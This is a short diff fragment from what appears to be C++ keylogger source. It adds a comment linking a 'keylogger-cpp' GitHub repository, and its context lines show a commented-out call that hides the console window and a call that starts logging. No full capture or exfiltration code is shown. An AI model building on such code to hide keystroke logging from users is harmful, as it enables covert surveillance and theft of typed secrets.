@@ -75,3 +75,5 @@ int main(){
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
     startLogging();
 }
+
+//https://github.com/Solomon04/keylogger-cpp
